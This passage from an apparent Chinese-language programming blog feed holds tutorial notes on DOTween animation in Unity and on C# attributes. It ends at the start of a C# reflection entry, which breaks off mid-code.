<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;通过修改tweener.fullPosition &#x3D; 3f使该动画在1s后直接播放完</span></pre></td></tr><tr><td class="code"><pre><span class="line">var tweener &#x3D; transform.DOMove(Vector3.one, 3f);</span></pre></td></tr><tr><td class="code"><pre><span class="line">await Task.Delay(TimeSpan.FromSeconds(1));</span></pre></td></tr><tr><td class="code"><pre><span class="line">tweener.fullPosition &#x3D; 3f;</span></pre></td></tr><tr><td class="code"><pre><span class="line">Debug.Log(tweener.fullPosition);</span></pre></td></tr></table></figure>

<p>2)通过延时输出循环次数</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tweener = transform.DOMove(Vector3.one, <span class="number">1f</span>).SetLoops(<span class="number">3</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> Task.Delay(TimeSpan.FromSeconds(<span class="number">1</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">print(tweener.CompletedLoops());</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> Task.Delay(TimeSpan.FromSeconds(<span class="number">1</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">print(tweener.CompletedLoops());</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> Task.Delay(TimeSpan.FromSeconds(<span class="number">1</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line">print(tweener.CompletedLoops());</span></pre></td></tr></table></figure>

<p>3)获取动画的时间数据</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tweener = transform.DOMove(Vector3.one, <span class="number">1f</span>).SetLoops(<span class="number">3</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//获取延时时间</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">tweener.Delay();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//获取当前动画的持续时间</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数：是否包含循环 </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//false 单次时间 true 循环的总时长</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">tweener.Duration();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//当前执行已完成的时间</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数：是否包含循环 </span></span></pre></td></tr><tr><td class="code"><pre><span class="line">tweener.Elapsed();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//单次循环，无参</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//动画时间完成的百分比</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">tweener.ElapsedDirectionalPercentage();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数：是否包含循环 </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//动画时间完成的百分比</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">tweener.ElapsedPercentage();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//动画是否在活动</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">tweener.IsActive();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//是否是反向动画</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">tweener.IsBackwards();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//动画是否完成</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">tweener.IsComplete();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//是否以初始化</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">tweener.IsInitialized();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//是否正在播放</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">tweener.IsPlaying();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//返回循环次数，  无限循环为Infinity</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">tweener.Loops();</span></pre></td></tr></table></figure>

<h2 id="十一、利用协程"><a href="#十一、利用协程" class="headerlink" title="十一、利用协程"></a>十一、利用协程</h2><p>开始便输出111111，等到动画播放完毕，再输出222222</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Tween _twn;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Start</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	_twn = transform.DOMove(Vector3.one, <span class="number">1f</span>).SetLoops(<span class="number">3</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	StartCoroutine(waitFun1());</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function">IEnumerator <span class="title">waitFu1n</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(<span class="string">"111111"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">yield</span> <span class="keyword">return</span> _twn.WaitForCompletion();</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(<span class="string">"222222"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<p>根据循环次数输出</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">_twn = transform.DOMove(Vector3.one, <span class="number">1f</span>).SetLoops(<span class="number">3</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">StartCoroutine(waitFun2());</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function">IEnumerator <span class="title">waitFun2</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">yield</span> <span class="keyword">return</span> _twn.WaitForElapsedLoops(<span class="number">1</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(<span class="string">"第一次循环结束"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">yield</span> <span class="keyword">return</span> _twn.WaitForElapsedLoops(<span class="number">2</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(<span class="string">"第二次循环结束"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">yield</span> <span class="keyword">return</span> _twn.WaitForElapsedLoops(<span class="number">3</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    print(<span class="string">"第三次循环结束"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function">IEnumerator <span class="title">waitFun3</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//当动画被杀死后执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">yield</span> <span class="keyword">return</span> _twn.WaitForKill();</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//当动画运动到1.5s的时候执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">yield</span> <span class="keyword">return</span> _twn.WaitForPosition(<span class="number">1.5f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//当动画重新开始的时候执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">yield</span> <span class="keyword">return</span> _twn.WaitForRewind();</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//当动画开始的时候执行</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">yield</span> <span class="keyword">return</span> _twn.WaitForStart()；</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h2 id="十二、设置动画路径"><a href="#十二、设置动画路径" class="headerlink" title="十二、设置动画路径"></a>十二、设置动画路径</h2><p>需要导入<font color="red">using System.Linq;</font>使用Linq</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Transform[] listTrans;</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Start</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Vector3[] listPosition = listTrans.Select(u =&gt; u.position).ToArray();</span></pre></td></tr><tr><td class="code"><pre><span class="line">    transform.DOPath(listPosition,<span class="number">5f</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//参数：运动路径，运动时间，运动曲线的类型，路径模式，路径分辨率，路径曲线的颜色</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//pathMode: 路径模式（用于确定正确的LookAt方向）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//它内部定义了四种类型</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//Ignore：忽略此参数和设置的LookAt参数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//Full3D：在3d场景下，代表物体可以看向任何方向</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//TopDown2D：代表物体只能上下旋转，看向物体</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//Sidescroller2D：代表物体只能左右旋转看向物体</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//路径分辨率，代表路径点之间的曲线由多少个点构成，也就是点越多，曲线就越圆，此参数在直线路径类型下无效,默认为10</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOPath(listPosition,<span class="number">5f</span>,PathType.Linear,PathMode.Full3D,<span class="number">10</span>,Color.red);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//始终看着(0,0,0)运动</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">transform.DOPath(listPosition,<span class="number">5f</span>,PathType.Linear,PathMode.Full3D,<span class="number">10</span>,Color.red).SetLookAt(<span class="keyword">new</span> Vector3(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>));</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//设置曲线为闭口</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">SetOptions(<span class="literal">true</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//始终看着正前方</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">SetLookAt(<span class="number">0</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//看的方向与运动路径呈一个角度（前提为闭口）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">SetLookAt(<span class="number">0.5</span>);</span></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Csharp特性</title>
    <url>/2021/04/15/Csharp%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<center>C#的特性</center>

<a id="more"></a>

<h3 id="1-特性是什么？"><a href="#1-特性是什么？" class="headerlink" title="1.特性是什么？"></a>1.特性是什么？</h3><p>特性是一种允许我们向程序的程序集添加元数据的语言结构<br>它是用于保存程序结构信息的某种特殊类型的类<br>特性提供功能强大的方法以将声明信息与 C# 代码（类型、方法、属性等）相关联。<br>特性与程序实体关联后，即可在运行时使用反射查询特性信息<br>特性的目的是告诉编译器把程序结构的某组元数据嵌入程序集中<br>它可以放置在几乎所有的声明中（类、变量、函数等等申明）</p>
<p>特性本质是个类<br>我们可以利用特性类为元数据添加额外信息<br>比如一个类、成员变量、成员方法等等为他们添加更多的额外信息<br>之后可以通过反射来获取这些额外信息</p>
<h3 id="2-自定义特性"><a href="#2-自定义特性" class="headerlink" title="2.自定义特性"></a>2.自定义特性</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">MyCustomAttribute</span> : <span class="title">Attribute</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="comment">//特性中的成员 一般根据需求来写</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">public</span> <span class="keyword">string</span> info;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MyCustomAttribute</span>(<span class="params"><span class="keyword">string</span> info</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>	&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">		<span class="keyword">this</span>.info = info;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TestFun</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>	&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Console.WriteLine(<span class="string">"特性的方法"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h3 id="3-特性的使用"><a href="#3-特性的使用" class="headerlink" title="3.特性的使用"></a>3.特性的使用</h3><p>基本语法:<br>[特性名(参数列表)]<br>本质上 就是在调用特性类的构造函数<br>写在哪里？<br>类、函数、变量上一行，表示他们具有该特性信息</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">[<span class="meta">MyCustom(<span class="meta-string">"这个是我自己写的一个用于计算的类"</span>)</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">[<span class="meta">MyCustom(<span class="meta-string">"这个是我自己写的一个用于计算的类"</span>)</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">MyClass</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	[<span class="meta">MyCustom(<span class="meta-string">"这是一个成员变量"</span>)</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="keyword">public</span> <span class="keyword">int</span> <span class="keyword">value</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	[<span class="meta">MyCustom(<span class="meta-string">"这是一个用于计算加法的函数"</span>)</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TestFun</span>(<span class="params"> [MyCustom(<span class="string">"函数参数"</span></span>)]<span class="keyword">int</span> a )</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>	&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TestFun</span>(<span class="params"><span class="keyword">int</span> a</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>	&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">	&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">MyClass mc = <span class="keyword">new</span> MyClass();</span></pre></td></tr><tr><td class="code"><pre><span class="line">Type t = mc.GetType();</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//t = typeof(MyClass);</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//t = Type.GetType("Lesson21_特性.MyClass");</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//判断是否使用了某个特性</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数一：特性的类型</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数二：代表是否搜索继承链（属性和事件忽略此参数）</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( t.IsDefined(<span class="keyword">typeof</span>(MyCustomAttribute), <span class="literal">false</span>) )</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Console.WriteLine(<span class="string">"该类型应用了MyCustom特性"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//获取Type元数据中的所有特性</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">object</span>[] array = t.GetCustomAttributes(<span class="literal">true</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.Length; i++)</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span>( array[i] <span class="keyword">is</span> MyCustomAttribute )</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        Console.WriteLine((array[i] <span class="keyword">as</span> MyCustomAttribute).info);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        (array[i] <span class="keyword">as</span> MyCustomAttribute).TestFun();</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h3 id="4-限制自定义特性的使用范围"><a href="#4-限制自定义特性的使用范围" class="headerlink" title="4.限制自定义特性的使用范围"></a>4.限制自定义特性的使用范围</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过为特性类 加特性 限制其使用范围</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">[<span class="meta">AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct, AllowMultiple = true, Inherited = true)</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数一：AttributeTargets —— 特性能够用在哪些地方</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数二：AllowMultiple —— 是否允许多个特性实例用在同一个目标上</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="comment">//参数三：Inherited —— 特性是否能被派生类和重写成员继承</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyCustom2Attribute</span> : <span class="title">Attribute</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h3 id="5-系统自带特性——过时特性"><a href="#5-系统自带特性——过时特性" class="headerlink" title="5.系统自带特性——过时特性"></a>5.系统自带特性——过时特性</h3><p>过时特性<br>Obsolete<br>用于提示用户 使用的方法等成员已经过时 建议使用新方法<br>一般加在函数前的特性</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">TestClass</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//参数一：调用过时方法时 提示的内容</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="comment">//参数二：true-使用该方法时会报错  false-使用该方法时直接警告</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    [<span class="meta">Obsolete(<span class="meta-string">"OldSpeak方法已经过时了，请使用Speak方法"</span>, false)</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OldSpeak</span>(<span class="params"><span class="keyword">string</span> str</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        Console.WriteLine(str);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Speak</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h3 id="6-系统自带特性——调用者信息特性"><a href="#6-系统自带特性——调用者信息特性" class="headerlink" title="6.系统自带特性——调用者信息特性"></a>6.系统自带特性——调用者信息特性</h3><p>哪个文件调用？<br>CallerFilePath特性<br>哪一行调用？<br>CallerLineNumber特性<br>哪个函数调用？<br>CallerMemberName特性</p>
<p>需要引用命名空间 using System.Runtime.CompilerServices;<br>一般作为函数参数的特性</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">TestClass2</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SpeakCaller</span>(<span class="params"><span class="keyword">string</span> str, [CallerFilePath]<span class="keyword">string</span> fileName = <span class="string">""</span>, </span></span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="params">                            [CallerLineNumber]<span class="keyword">int</span> line = <span class="number">0</span>, [CallerMemberName]<span class="keyword">string</span> target = <span class="string">""</span></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        Console.WriteLine(str);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//输出调用的文件名  --&gt; H:\unity\c#进阶\Csharp进阶\Lesson21_特性\Program.cs</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        Console.WriteLine(fileName);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//输出调用该函数 --&gt; 97</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        Console.WriteLine(line);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//输出调用该函数名 --&gt; Main</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        Console.WriteLine(target);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h3 id="7-系统自带特性——条件编译特性"><a href="#7-系统自带特性——条件编译特性" class="headerlink" title="7.系统自带特性——条件编译特性"></a>7.系统自带特性——条件编译特性</h3><p>条件编译特性<br>Conditional<br>它会和预处理指令 #define配合使用</p>
<p>需要引用命名空间using System.Diagnostics;<br>主要可以用在一些调试代码上<br>有时想执行有时不想执行的代码</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//若不加#define则不会执行该函数</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Fun</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">[<span class="meta">Conditional(<span class="meta-string">"Fun"</span>)</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Fun</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    Console.WriteLine(<span class="string">"Fun执行"</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>

<h3 id="8-系统自带特性——外部Dll包函数特性"><a href="#8-系统自带特性——外部Dll包函数特性" class="headerlink" title="8.系统自带特性——外部Dll包函数特性"></a>8.系统自带特性——外部Dll包函数特性</h3><p>DllImport</p>
<p>用来标记非.Net(C#)的函数，表明该函数在一个外部的DLL中定义。<br>一般用来调用 C或者C++的Dll包写好的方法<br>需要引用命名空间 using System.Runtime.InteropServices</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">[<span class="meta">DllImport(<span class="meta-string">"Test.dll"</span>)</span>]</span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">Add</span>(<span class="params"><span class="keyword">int</span> a, <span class="keyword">int</span> b</span>)</span>;</span></pre></td></tr></table></figure>

<h3 id="9-总结"><a href="#9-总结" class="headerlink" title="9.总结"></a>9.总结</h3><p>特性是用于 为元数据再添加更多的额外信息（变量、方法等等）<br>我们可以通过反射获取这些额外的数据 来进行一些特殊的处理<br>自定义特性——继承Attribute类</p>
<p>系统自带特性：过时特性</p>
<p>为什么要学习特性?<br>Unity引擎中很多地方都用到了特性来进行一些特殊处理</p>
]]></content>
  </entry>
  <entry>
    <title>Csharp反射</title>
    <url>/2021/04/14/Csharp%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<center>今天学习了C#的反射，记录一下</center>

<a id="more"></a>

<h3 id="1-什么是程序集"><a href="#1-什么是程序集" class="headerlink" title="1.什么是程序集"></a>1.什么是程序集</h3><p>程序集是经由编译器编译得到的，供进一步编译执行的那个中间产物<br>在WINDOWS系统中，它一般表现为后缀为·dll（库文件）或者是·exe（可执行文件）的格式</p>
<h3 id="2-元数据"><a href="#2-元数据" class="headerlink" title="2.元数据"></a>2.元数据</h3><p>元数据就是用来描述数据的数据<br>这个概念不仅仅用于程序上，在别的领域也有元数据</p>
<p>程序中的类，类中的函数、变量等等信息就是 程序的 元数据<br>有关程序以及类型的数据被称为 元数据，它们保存在程序集中</p>
<h3 id="3-反射的概念"><a href="#3-反射的概念" class="headerlink" title="3.反射的概念"></a>3.反射的概念</h3><p>程序正在运行时，可以查看其它程序集或者自身的元数据。<br>一个运行的程序查看本身或者其它程序的元数据的行为就叫做反射。</p>
<p>在程序运行时，通过反射可以得到其它程序集或者自己程序集代码的各种信息<br>类，函数，变量，对象等等，实例化它们，执行它们，操作它们</p>
<h3 id="4-反射的作用"><a href="#4-反射的作用" class="headerlink" title="4.反射的作用"></a>4.反射的作用</h3><p>因为反射可以在程序编译后获得信息，所以它提高了程序的拓展性和灵活性<br>1.程序运行时得到所有元数据，包括元数据的特性<br>2.程序运行时，实例化对象，操作对象<br>3.程序运行时创建新对象，用这些对象执行任务</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在同一个类中定义一个测试类</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Test</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> i = <span class="number">1</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> j = <span class="number">0</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> str = <span class="string">"123"</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test</span>(<span class="params"><span class="keyword">int</span> i</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">this</span>.i = i;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Test</span>(<span class="params"> <span class="keyword">int</span> i, <span class="keyword">string</span> str </span>):<span class="title">this</span>(<span class="params">i</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">this</span>.str = str;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Speak</span>(<span class="params"></span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="function"></span>    &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        Console.WriteLine(i);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    